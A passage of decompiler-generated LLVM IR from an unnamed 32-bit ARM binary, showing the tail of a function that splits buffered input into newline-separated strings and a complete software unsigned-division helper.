dec_label_pc_fec0:                                ; preds = %dec_label_pc_fe84, %dec_label_pc_fe60
  store i32 ptrtoint ([3 x i8]* @global_var_16f20.205 to i32), i32* @r1, align 4
  %v4_fecc = call i32 @function_11e10(i8* %stack_var_-72.018, i32 ptrtoint ([3 x i8]* @global_var_16f20.205 to i32))
  %v2_fed4 = icmp eq i32 %v4_fecc, 0
  br i1 %v2_fed4, label %dec_label_pc_fedc, label %dec_label_pc_ffe4

dec_label_pc_fedc:                                ; preds = %dec_label_pc_fec0
  %v0_fedc = call i32 @function_a058()
  %v2_fee4 = icmp eq i32 %v0_fedc, 0
  br i1 %v2_fee4, label %dec_label_pc_feec, label %dec_label_pc_1016c

dec_label_pc_feec:                                ; preds = %dec_label_pc_fedc
  store i32 1024, i32* @r2, align 4
  %v3_ff04 = call i32 @function_11d70(i8* %v2_ff04, i32 0)
  %v5_ff24 = call i32 @function_8e70(i32 %v2_fef4, i32 ptrtoint ([8 x i8]* @global_var_16f24.207 to i32), i32 %v1_fe70, i32 %v2_fef4)
  %v3_ff40 = call i32 @function_8f7c(i32 %v2_fef4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_16f2c.209, i32 0, i32 0))
  br label %dec_label_pc_ffac

dec_label_pc_ff50:                                ; preds = %dec_label_pc_ffac
  %v1_ff60 = call i32 @function_8538(i32 %v2_fef4)
  %v2_ff68 = load i32, i32* @global_var_205d0.63, align 4
  store i32 %v2_fef4, i32* @r2, align 4
  %v3_ff84 = call i32 @function_8eb4(i32 %v2_ff68, i32 ptrtoint ([3 x i8]* @global_var_16f30.211 to i32))
  store i32 1024, i32* @r2, align 4
  %v3_ffa0 = call i32 @function_11d70(i8* %v2_ff04, i32 0)
  %v1_ffa8 = call i32 @function_134f4(i32 1)
  br label %dec_label_pc_ffac

dec_label_pc_ffac:                                ; preds = %dec_label_pc_feec, %dec_label_pc_ff50
  %v4_ffc4 = call i32 @function_9388(i32 %v2_fef4, i32 1024, i32 %v3_ff40, i32 %v2_fef4)
  %v2_ffcc = icmp eq i32 %v4_ffc4, 0
  br i1 %v2_ffcc, label %dec_label_pc_ffd4, label %dec_label_pc_ff50

dec_label_pc_ffd4:                                ; preds = %dec_label_pc_ffac
  %v1_ffd8 = call i32 @function_9204(i32 %v3_ff40)
  %v1_ffe0 = call i32 @function_133cc(i32 0)
  br label %dec_label_pc_ffe4

dec_label_pc_ffe4:                                ; preds = %dec_label_pc_fec0, %dec_label_pc_ffd4
  store i32 %v1_fe70, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_16f34.213 to i32), i32* @r1, align 4
  %v2_fff8 = call i32 @function_12340(i32 %v1_fe70, i32 ptrtoint (i32* @global_var_16f34.213 to i32))
  store i32 %v1_fd9c, i32* %stack_var_-136, align 4
  %v2_100f437 = icmp eq i32 %v2_fff8, 0
  br i1 %v2_100f437, label %dec_label_pc_100fc, label %dec_label_pc_10010

dec_label_pc_10010:                               ; preds = %dec_label_pc_ffe4, %dec_label_pc_100dc
  %stack_var_-40.040.in = phi i32 [ %v2_100e4, %dec_label_pc_100dc ], [ %v2_fff8, %dec_label_pc_ffe4 ]
  %stack_var_-44.138 = phi i32 [ %stack_var_-44.0, %dec_label_pc_100dc ], [ 1, %dec_label_pc_ffe4 ]
  %stack_var_-40.040 = inttoptr i32 %stack_var_-40.040.in to i8*
  %v2_10014 = load i8, i8* %stack_var_-40.040, align 1
  %v7_10018 = icmp eq i8 %v2_10014, 10
  br i1 %v7_10018, label %dec_label_pc_100dc, label %dec_label_pc_10020

dec_label_pc_10020:                               ; preds = %dec_label_pc_10010
  store i32 %stack_var_-44.138, i32* @r4, align 4
  store i32 %stack_var_-40.040.in, i32* @r0, align 4
  %v0_1002c = call i32 @function_11e30()
  %v1_10034 = add i32 %v0_1002c, 1
  %v1_1003c = call i32 @function_127d4(i32 %v1_10034)
  %v0_1004c = load i32, i32* @r4, align 4
  %v3_1004c = mul i32 %v0_1004c, 4
  %v2_10058 = add i32 %v2_1013c, %v3_1004c
  %v2_1005c = inttoptr i32 %v2_10058 to i32*
  store i32 %v1_1003c, i32* %v2_1005c, align 4
  %v3_10068 = mul i32 %stack_var_-44.138, 4
  %v2_10074 = add i32 %v2_1013c, %v3_10068
  %v1_10078 = inttoptr i32 %v2_10074 to i32*
  %v2_10078 = load i32, i32* %v1_10078, align 4
  store i32 %v2_10078, i32* @r4, align 4
  store i32 %stack_var_-40.040.in, i32* @r0, align 4
  %v0_10084 = call i32 @function_11e30()
  %v1_1008c = add i32 %v0_10084, 1
  %v0_10090 = load i32, i32* @r4, align 4
  store i32 %v1_1008c, i32* @r2, align 4
  %v2_100a0 = inttoptr i32 %v0_10090 to i8*
  %v3_100a0 = call i32 @function_11d70(i8* %v2_100a0, i32 0)
  %v2_100bc = load i32, i32* %v1_10078, align 4
  %v4_100cc = call i32 @function_11f98(i32 %v2_100bc, i8* nonnull %stack_var_-40.040)
  %v1_100d4 = add i32 %stack_var_-44.138, 1
  br label %dec_label_pc_100dc

dec_label_pc_100dc:                               ; preds = %dec_label_pc_10010, %dec_label_pc_10020
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.138, %dec_label_pc_10010 ], [ %v1_100d4, %dec_label_pc_10020 ]
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_16f34.213 to i32), i32* @r1, align 4
  %v2_100e4 = call i32 @function_12340(i32 0, i32 ptrtoint (i32* @global_var_16f34.213 to i32))
  %v2_100f4 = icmp eq i32 %v2_100e4, 0
  br i1 %v2_100f4, label %dec_label_pc_100fc, label %dec_label_pc_10010

dec_label_pc_100fc:                               ; preds = %dec_label_pc_100dc, %dec_label_pc_ffe4
  %stack_var_-44.1.lcssa = phi i32 [ 1, %dec_label_pc_ffe4 ], [ %stack_var_-44.0, %dec_label_pc_100dc ]
  %v3_10108 = call i32 @function_e620(i32 %stack_var_-44.1.lcssa, i32* nonnull %stack_var_-136)
  %v7_10114 = icmp slt i32 %stack_var_-44.1.lcssa, 2
  br i1 %v7_10114, label %dec_label_pc_1016c, label %dec_label_pc_1012c.lr.ph

dec_label_pc_1012c.lr.ph:                         ; preds = %dec_label_pc_100fc
  br label %dec_label_pc_1012c

dec_label_pc_1012c:                               ; preds = %dec_label_pc_1012c.lr.ph, %dec_label_pc_1012c
  %storemerge15115 = phi i32 [ 1, %dec_label_pc_1012c.lr.ph ], [ %v1_10154, %dec_label_pc_1012c ]
  %v3_10134 = mul i32 %storemerge15115, 4
  %v2_10140 = add i32 %v2_1013c, %v3_10134
  %v1_10144 = inttoptr i32 %v2_10140 to i32*
  %v2_10144 = load i32, i32* %v1_10144, align 4
  %v1_1014c = call i32 @function_12928(i32 %v2_10144)
  %v1_10154 = add nuw nsw i32 %storemerge15115, 1
  %v5_10168 = icmp slt i32 %v1_10154, %stack_var_-44.1.lcssa
  br i1 %v5_10168, label %dec_label_pc_1012c, label %dec_label_pc_1016c

dec_label_pc_1016c:                               ; preds = %dec_label_pc_1012c, %dec_label_pc_fedc, %dec_label_pc_fcfc, %dec_label_pc_100fc, %dec_label_pc_fd58, %dec_label_pc_fcac, %dec_label_pc_f7b4
  %v2_10170 = load i32, i32* @global_var_205d0.63, align 4
  %v5_1018c = call i32 @function_9aec(i32 %v2_10170, i8* %v4_1018c, i32 4096, i32 %v2_1017c)
  %v3_1019c = icmp eq i32 %v5_1018c, -1
  br i1 %v3_1019c, label %dec_label_pc_f788, label %dec_label_pc_fa64

dec_label_pc_101a8:                               ; preds = %dec_label_pc_fb98, %dec_label_pc_fc0c, %dec_label_pc_fc50, %dec_label_pc_fb50
  %v18_101ac = phi i32 [ 0, %dec_label_pc_fc0c ], [ %v3_fc40, %dec_label_pc_fc50 ], [ %v3_fb60, %dec_label_pc_fb50 ], [ 0, %dec_label_pc_fb98 ]
  ret i32 %v18_101ac

; uselistorder directives
  uselistorder i32 %v5_1018c, { 1, 0 }
  uselistorder i32 %stack_var_-44.1.lcssa, { 2, 0, 1 }
  uselistorder i32 %v2_100e4, { 1, 0 }
  uselistorder i8* %stack_var_-40.040, { 1, 0 }
  uselistorder i32 %stack_var_-44.138, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge5, { 1, 0 }
  uselistorder i32 %v1_fea8, { 1, 0 }
  uselistorder i8* %storemerge534, { 1, 0 }
  uselistorder i32 %v1_fe70, { 1, 2, 0 }
  uselistorder i8* %stack_var_-72.018, { 3, 0, 4, 2, 1, 5 }
  uselistorder i32 %v2_fde8, { 1, 2, 0 }
  uselistorder i32 %v1_fd9c, { 5, 0, 2, 1, 3, 6, 8, 4, 7 }
  uselistorder i8* %storemerge6, { 0, 1, 3, 4, 2 }
  uselistorder i1 %v9_faa0, { 1, 0 }
  uselistorder i32 %v3_fa6c, { 1, 0 }
  uselistorder i32 %storemerge12, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v3_f98c, { 1, 0 }
  uselistorder i32 %v1_f970, { 1, 0 }
  uselistorder i32 %v1_f848, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1013c, { 2, 0, 1 }
  uselistorder i32 %v2_fef4, { 2, 5, 3, 4, 6, 1, 0 }
  uselistorder i8* %v4_1018c, { 2, 0, 1 }
  uselistorder i32 %v2_1017c, { 7, 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 %v2_f724, { 1, 0 }
  uselistorder i32 %v0_f70c, { 1, 0, 2 }
  uselistorder i32 %storemerge11, { 2, 0, 1 }
  uselistorder i32 %v2_f664, { 1, 0 }
  uselistorder i32 %v22_f57c, { 3, 0, 1, 2 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_12340, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_16f34.213 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32, i32)* @function_9388, { 3, 2, 1, 0 }
  uselistorder i32 ()* @function_a058, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_109e4, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_26650.191, { 0, 2, 1, 3, 4 }
  uselistorder i32 (i32)* @function_8538, { 1, 0 }
  uselistorder i32 (i32)* @function_12928, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_127d4, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_205d8.67, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* @global_var_26654.70, { 0, 2, 3, 4, 5, 6, 7, 8, 1, 9, 10 }
  uselistorder i32 (i32, i32)* @function_8eb4, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_205d0.63, { 2, 3, 4, 5, 6, 7, 8, 0, 1, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 (i32)* @function_134f4, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_10998, { 2, 1, 0 }
  uselistorder i32 ()* @function_106d0, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_10ad8, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_16e64.170 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_16e5c.174 to i32), { 1, 0 }
  uselistorder i32 ()* @function_81f8, { 1, 0 }
  uselistorder i32 ()* @function_8218, { 1, 0 }
  uselistorder i32 (i32)* @function_81dc, { 1, 0 }
  uselistorder i32 (i32)* @function_832c, { 1, 0 }
  uselistorder i32 (i32)* @function_12ec0, { 1, 0 }
  uselistorder i32 (i32*)* @function_1096c, { 0, 1, 21, 22, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 20, 14, 15, 16, 17, 18, 19 }
  uselistorder label %dec_label_pc_101a8, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1016c, { 0, 3, 1, 4, 2, 5, 6 }
  uselistorder label %dec_label_pc_1012c, { 1, 0 }
  uselistorder label %dec_label_pc_100dc, { 1, 0 }
  uselistorder label %dec_label_pc_10010, { 1, 0 }
  uselistorder label %dec_label_pc_ffe4, { 1, 0 }
  uselistorder label %dec_label_pc_ffac, { 1, 0 }
  uselistorder label %dec_label_pc_fe84, { 1, 0 }
  uselistorder label %dec_label_pc_fe60, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fe50, { 1, 0 }
  uselistorder label %dec_label_pc_fdd0, { 1, 0 }
  uselistorder label %dec_label_pc_fd38, { 1, 0 }
  uselistorder label %dec_label_pc_fcfc, { 1, 0 }
  uselistorder label %dec_label_pc_fbdc, { 1, 0 }
  uselistorder label %dec_label_pc_fad8, { 1, 0 }
  uselistorder label %dec_label_pc_fa58, { 1, 0 }
  uselistorder label %dec_label_pc_f9c8, { 1, 0 }
  uselistorder label %dec_label_pc_f988, { 1, 0 }
  uselistorder label %dec_label_pc_f89c, { 1, 0 }
  uselistorder label %dec_label_pc_f854, { 1, 0 }
  uselistorder label %dec_label_pc_f788, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f76c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f6b8, { 1, 0 }
}

define i32 @function_10218() local_unnamed_addr {
dec_label_pc_10218:
  %v0_10218 = load i32, i32* @r1, align 4
  %v1_10218 = add i32 %v0_10218, -1
  %v7_10218 = icmp eq i32 %v0_10218, 1
  br i1 %v7_10218, label %bb, label %bb82

bb:                                               ; preds = %dec_label_pc_10218
  %v2_1021c = load i32, i32* @r0, align 4
  ret i32 %v2_1021c

bb82:                                             ; preds = %dec_label_pc_10218
  %v2_10218 = icmp eq i32 %v0_10218, 0
  br i1 %v2_10218, label %dec_label_pc_10300, label %dec_label_pc_10224

dec_label_pc_10224:                               ; preds = %bb82
  %v0_10224 = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_10224, %v0_10218
  br i1 %tmp, label %dec_label_pc_1022c, label %dec_label_pc_102b8

dec_label_pc_1022c:                               ; preds = %dec_label_pc_10224
  %v2_1022c = and i32 %v1_10218, %v0_10218
  %v4_1022c = icmp eq i32 %v2_1022c, 0
  br i1 %v4_1022c, label %dec_label_pc_102c4, label %dec_label_pc_10234

dec_label_pc_10234:                               ; preds = %dec_label_pc_1022c
  %v3_10234 = icmp ult i32 %v0_10218, 536870912
  br i1 %v3_10234, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_10234
  %v4_10238 = mul i32 %v0_10218, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_10234, %.thread
  %v0_10258.pr36.ph = phi i32 [ %v4_10238, %.thread ], [ %v0_10218, %dec_label_pc_10234 ]
  %storemerge137 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_10234 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb85
  %v0_10258.pr36 = phi i32 [ %v4_1024c, %bb85 ], [ %v0_10258.pr36.ph, %.preheader.preheader ]
  %v1_10250 = phi i32 [ %v4_10250, %bb85 ], [ %storemerge137, %.preheader.preheader ]
  %v2_10244 = icmp ugt i32 %v0_10258.pr36, 268435455
  br i1 %v2_10244, label %.thread2, label %bb83

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_10258thread-pre-split.loopexit

bb83:                                             ; preds = %.preheader
  %v4_10248 = icmp ult i32 %v0_10258.pr36, %v0_10224
  br i1 %v4_10248, label %bb84, label %dec_label_pc_10258thread-pre-split.loopexit.loopexit

bb84:                                             ; preds = %bb83
  %v2_1024c = and i32 %v0_10258.pr36, 268435456
  %v3_1024c = icmp eq i32 %v2_1024c, 0
  %v4_1024c = mul i32 %v0_10258.pr36, 16
  br i1 %v3_1024c, label %bb85, label %dec_label_pc_10258.loopexit

bb85:                                             ; preds = %bb84
  %v2_10250 = and i32 %v1_10250, 268435456
  %v3_10250 = icmp eq i32 %v2_10250, 0
  %v4_10250 = mul i32 %v1_10250, 16
  br i1 %v3_10250, label %.preheader, label %dec_label_pc_10258thread-pre-split.loopexit.loopexit

dec_label_pc_10258thread-pre-split.loopexit.loopexit: ; preds = %bb85, %bb83
  %v1_1026448.ph = phi i32 [ %v1_10250, %bb83 ], [ %v4_10250, %bb85 ]
  %v0_10258.pr38.ph = phi i32 [ %v0_10258.pr36, %bb83 ], [ %v4_1024c, %bb85 ]
  br label %dec_label_pc_10258thread-pre-split.loopexit

dec_label_pc_10258thread-pre-split.loopexit:      ; preds = %dec_label_pc_10258thread-pre-split.loopexit.loopexit, %.thread2
  %v1_1026448 = phi i32 [ %v1_10250, %.thread2 ], [ %v1_1026448.ph, %dec_label_pc_10258thread-pre-split.loopexit.loopexit ]
  %v0_10258.pr38 = phi i32 [ %v0_10258.pr36, %.thread2 ], [ %v0_10258.pr38.ph, %dec_label_pc_10258thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_10258thread-pre-split

dec_label_pc_10258thread-pre-split:               ; preds = %dec_label_pc_10258thread-pre-split.loopexit, %bb87
  %v1_1026446 = phi i32 [ %v1_1026448, %dec_label_pc_10258thread-pre-split.loopexit ], [ %v3_10264, %bb87 ]
  %v0_10258.pr = phi i32 [ %v0_10258.pr38, %dec_label_pc_10258thread-pre-split.loopexit ], [ %v3_10260, %bb87 ]
  br label %dec_label_pc_10258

dec_label_pc_10258.loopexit:                      ; preds = %bb84
  br label %dec_label_pc_10258

dec_label_pc_10258:                               ; preds = %dec_label_pc_10258.loopexit, %dec_label_pc_10258thread-pre-split
  %v1_10264 = phi i32 [ %v1_1026446, %dec_label_pc_10258thread-pre-split ], [ %v1_10250, %dec_label_pc_10258.loopexit ]
  %v1_10260 = phi i32 [ %v0_10258.pr, %dec_label_pc_10258thread-pre-split ], [ %v4_1024c, %dec_label_pc_10258.loopexit ]
  %v2_10258 = icmp slt i32 %v1_10260, 0
  br i1 %v2_10258, label %dec_label_pc_1026c, label %bb86

bb86:                                             ; preds = %dec_label_pc_10258
  %v4_1025c = icmp ult i32 %v1_10260, %v0_10224
  br i1 %v4_1025c, label %bb87, label %dec_label_pc_1026c

bb87:                                             ; preds = %bb86
  %v3_10260 = mul i32 %v1_10260, 2
  %v2_10264 = icmp slt i32 %v1_10264, 0
  %v3_10264 = mul i32 %v1_10264, 2
  br i1 %v2_10264, label %dec_label_pc_1026c, label %dec_label_pc_10258thread-pre-split

dec_label_pc_1026c:                               ; preds = %bb86, %dec_label_pc_10258, %bb87
  %v2_1027859 = phi i32 [ %v3_10264, %bb87 ], [ %v1_10264, %bb86 ], [ %v1_10264, %dec_label_pc_10258 ]
  %v1_1027051 = phi i32 [ %v3_10260, %bb87 ], [ %v1_10260, %bb86 ], [ %v1_10260, %dec_label_pc_10258 ]
  br label %dec_label_pc_10270

dec_label_pc_10270:                               ; preds = %.thread11, %dec_label_pc_1026c
  %v1_102a4 = phi i32 [ %v4_102a4, %.thread11 ], [ %v2_1027859, %dec_label_pc_1026c ]
  %v1_10278 = phi i32 [ %v0_102b0, %.thread11 ], [ 0, %dec_label_pc_1026c ]
  %v1_102a8 = phi i32 [ %v4_102a8, %.thread11 ], [ %v1_1027051, %dec_label_pc_1026c ]
  %v1_10274 = phi i32 [ %v0_102a0, %.thread11 ], [ %v0_10224, %dec_label_pc_1026c ]
  %v3_10270 = icmp ult i32 %v1_10274, %v1_102a8
  br i1 %v3_10270, label %.thread7, label %bb88

bb88:                                             ; preds = %dec_label_pc_10270
  %v3_10274 = sub i32 %v1_10274, %v1_102a8
  %v3_10278 = or i32 %v1_10278, %v1_102a4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_10270, %bb88
  %v1_10280 = phi i32 [ %v1_10274, %dec_label_pc_10270 ], [ %v3_10274, %bb88 ]
  %v1_10284 = phi i32 [ %v1_10278, %dec_label_pc_10270 ], [ %v3_10278, %bb88 ]
  %v4_1027c = udiv i32 %v1_102a8, 2
  %v6_1027c = icmp ult i32 %v1_10280, %v4_1027c
  br i1 %v6_1027c, label %.thread8, label %bb89

bb89:                                             ; preds = %.thread7
  %v3_10280 = urem i32 %v1_102a8, 2
  %v4_10280 = icmp eq i32 %v3_10280, 0
  %v6_10280 = sub i32 %v1_10280, %v4_1027c
  br i1 %v4_10280, label %.thread8, label %bb90

bb90:                                             ; preds = %bb89
  %v5_10284 = udiv i32 %v1_102a4, 2
  %v6_10284 = or i32 %v1_10284, %v5_10284
  br label %.thread8

.thread8:                                         ; preds = %bb89, %.thread7, %bb90
  %v1_1028c = phi i32 [ %v6_10280, %bb89 ], [ %v1_10280, %.thread7 ], [ %v6_10280, %bb90 ]
  %v1_10290 = phi i32 [ %v1_10284, %bb89 ], [ %v1_10284, %.thread7 ], [ %v6_10284, %bb90 ]
  %v4_10288 = udiv i32 %v1_102a8, 4
  %v6_10288 = icmp ult i32 %v1_1028c, %v4_10288
  br i1 %v6_10288, label %.thread9, label %bb91

bb91:                                             ; preds = %.thread8
  %v3_1028c = and i32 %v1_102a8, 2
  %v4_1028c = icmp eq i32 %v3_1028c, 0
  %v6_1028c = sub i32 %v1_1028c, %v4_10288
  br i1 %v4_1028c, label %.thread9, label %bb92

bb92:                                             ; preds = %bb91
  %v5_10290 = udiv i32 %v1_102a4, 4
  %v6_10290 = or i32 %v1_10290, %v5_10290
  br label %.thread9

.thread9:                                         ; preds = %bb91, %.thread8, %bb92
  %v1_10298 = phi i32 [ %v6_1028c, %bb91 ], [ %v1_1028c, %.thread8 ], [ %v6_1028c, %bb92 ]
  %v1_1029c = phi i32 [ %v1_10290, %bb91 ], [ %v1_10290, %.thread8 ], [ %v6_10290, %bb92 ]
  %v4_10294 = udiv i32 %v1_102a8, 8
  %v6_10294 = icmp ult i32 %v1_10298, %v4_10294
  br i1 %v6_10294, label %thread-pre-split, label %bb93

bb93:                                             ; preds = %.thread9
  %v3_10298 = and i32 %v1_102a8, 4
  %v4_10298 = icmp eq i32 %v3_10298, 0
  %v6_10298 = sub i32 %v1_10298, %v4_10294
  br i1 %v4_10298, label %thread-pre-split, label %bb94

bb94:                                             ; preds = %bb93
  %v5_1029c = udiv i32 %v1_102a4, 8
  %v6_1029c = or i32 %v1_1029c, %v5_1029c
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb94, %.thread9, %bb93
  %v0_102b0 = phi i32 [ %v1_1029c, %bb93 ], [ %v1_1029c, %.thread9 ], [ %v6_1029c, %bb94 ]
  %v0_102a0 = phi i32 [ %v6_10298, %bb93 ], [ %v1_10298, %.thread9 ], [ %v6_10298, %bb94 ]
  %v2_102a0 = icmp eq i32 %v0_102a0, 0
  br i1 %v2_102a0, label %dec_label_pc_102b0, label %bb95

bb95:                                             ; preds = %thread-pre-split
  %tmp142 = icmp ult i32 %v1_102a4, 16
  br i1 %tmp142, label %dec_label_pc_102b0, label %.thread11

.thread11:                                        ; preds = %bb95
  %v4_102a4 = udiv i32 %v1_102a4, 16
  %v4_102a8 = udiv i32 %v1_102a8, 16
  br label %dec_label_pc_10270

dec_label_pc_102b0:                               ; preds = %thread-pre-split, %bb95
  ret i32 %v0_102b0

dec_label_pc_102b8:                               ; preds = %dec_label_pc_10224
  %v9_10224 = icmp eq i32 %v0_10224, %v0_10218
  %. = zext i1 %v9_10224 to i32
  ret i32 %.

dec_label_pc_102c4:                               ; preds = %dec_label_pc_1022c
  %v2_102c4 = icmp ugt i32 %v0_10218, 65535
  br i1 %v2_102c4, label %bb99, label %.thread16

bb99:                                             ; preds = %dec_label_pc_102c4
  %v2_102c8 = and i32 %v0_10218, 32768
  %v3_102c8 = icmp eq i32 %v2_102c8, 0
  %v4_102c8 = udiv i32 %v0_10218, 65536
  br i1 %v3_102c8, label %.thread16, label %bb100

.thread16:                                        ; preds = %bb99, %dec_label_pc_102c4
  %v0_102d465 = phi i32 [ %v0_10218, %dec_label_pc_102c4 ], [ %v4_102c8, %bb99 ]
  br label %bb100

bb100:                                            ; preds = %bb99, %.thread16
  %v1_102d8 = phi i32 [ %v0_102d465, %.thread16 ], [ %v4_102c8, %bb99 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb99 ]
  %v2_102d4 = icmp ugt i32 %v1_102d8, 255
  br i1 %v2_102d4, label %bb101, label %.thread17

bb101:                                            ; preds = %bb100
  %v2_102d8 = and i32 %v1_102d8, 128
  %v3_102d8 = icmp eq i32 %v2_102d8, 0
  %v4_102d8 = udiv i32 %v1_102d8, 256
  br i1 %v3_102d8, label %.thread17, label %bb102

bb102:                                            ; preds = %bb101
  %v2_102dc = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb101, %bb100, %bb102
  %v1_102e8 = phi i32 [ %storemerge, %bb100 ], [ %storemerge, %bb101 ], [ %v2_102dc, %bb102 ]
  %v1_102e4 = phi i32 [ %v1_102d8, %bb100 ], [ %v4_102d8, %bb101 ], [ %v4_102d8, %bb102 ]
  %v2_102e0 = icmp ugt i32 %v1_102e4, 15
  br i1 %v2_102e0, label %bb103, label %.thread18

bb103:                                            ; preds = %.thread17
  %v2_102e4 = and i32 %v1_102e4, 8
  %v3_102e4 = icmp eq i32 %v2_102e4, 0
  %v4_102e4 = udiv i32 %v1_102e4, 16
  br i1 %v3_102e4, label %.thread18, label %bb104

bb104:                                            ; preds = %bb103
  %v2_102e8 = add nsw i32 %v1_102e8, 4
  br label %.thread18

.thread18:                                        ; preds = %bb103, %.thread17, %bb104
  %v4_102f0 = phi i32 [ %v1_102e8, %.thread17 ], [ %v1_102e8, %bb103 ], [ %v2_102e8, %bb104 ]
  %v5_102f4 = phi i32 [ %v1_102e4, %.thread17 ], [ %v4_102e4, %bb103 ], [ %v4_102e4, %bb104 ]
  %v2_102ec = icmp ugt i32 %v5_102f4, 3
  %v7_102ec = icmp eq i32 %v5_102f4, 4
  %v2_102f0 = xor i1 %v7_102ec, true
  %v3_102f0 = and i1 %v2_102ec, %v2_102f0
  br i1 %v3_102f0, label %bb105, label %bb106

bb105:                                            ; preds = %.thread18
  %v5_102f0 = add nsw i32 %v4_102f0, 3
  br label %bb106

bb106:                                            ; preds = %.thread18, %bb105
  %v4_102f4 = phi i32 [ %v4_102f0, %.thread18 ], [ %v5_102f0, %bb105 ]
  %v2_102f4 = xor i1 %v2_102ec, true
  %v3_102f4 = or i1 %v7_102ec, %v2_102f4
  br i1 %v3_102f4, label %bb107, label %bb108

bb107:                                            ; preds = %bb106
  %v8_102f4 = udiv i32 %v5_102f4, 2
  %v9_102f4 = add i32 %v4_102f4, %v8_102f4
  br label %bb108

bb108:                                            ; preds = %bb106, %bb107
  %v1_102f8 = phi i32 [ %v4_102f4, %bb106 ], [ %v9_102f4, %bb107 ]
  %v6_102f8 = lshr i32 %v0_10224, %v1_102f8
  ret i32 %v6_102f8

dec_label_pc_10300:                               ; preds = %bb82
  %v0_10300 = load i32, i32* @lr, align 4
  %v0_10304 = call i32 @function_104d8()
  store i32 0, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v0_10300)
  %v9_10310 = load i32, i32* @lr, align 4
  %v0_10314 = call i32 @function_10218()
  store i32 %v9_10310, i32* @lr, align 4
  ret i32 %v0_10314

; uselistorder directives
  uselistorder i32 %v4_102f4, { 1, 0 }
  uselistorder i1 %v7_102ec, { 1, 0 }
  uselistorder i32 %v4_102e4, { 1, 0 }
  uselistorder i32 %v1_102e4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_102d8, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_102d8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_102c8, { 1, 0 }
  uselistorder i32 %v0_102a0, { 1, 0 }
  uselistorder i32 %v4_10294, { 1, 0 }
  uselistorder i32 %v1_1029c, { 1, 2, 0 }
  uselistorder i32 %v4_10288, { 1, 0 }
  uselistorder i32 %v1_10290, { 1, 2, 0 }
  uselistorder i32 %v4_1027c, { 1, 0 }
  uselistorder i32 %v1_10284, { 1, 2, 0 }
  uselistorder i32 %v1_102a8, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_10278, { 1, 0 }
  uselistorder i32 %v1_102a4, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_10264, { 1, 0 }
  uselistorder i32 %v3_10260, { 1, 0 }
  uselistorder i32 %v1_10260, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_10264, { 1, 2, 0, 3 }
  uselistorder i32 %v4_10250, { 1, 0 }
  uselistorder i32 %v4_1024c, { 2, 1, 0 }
  uselistorder i32 %v1_10250, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_10258.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_10224, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_10218, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1, 10, 12, 11 }
  uselistorder label %bb108, { 1, 0 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb100, { 1, 0 }
  uselistorder label %dec_label_pc_102b0, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_1026c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10258thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

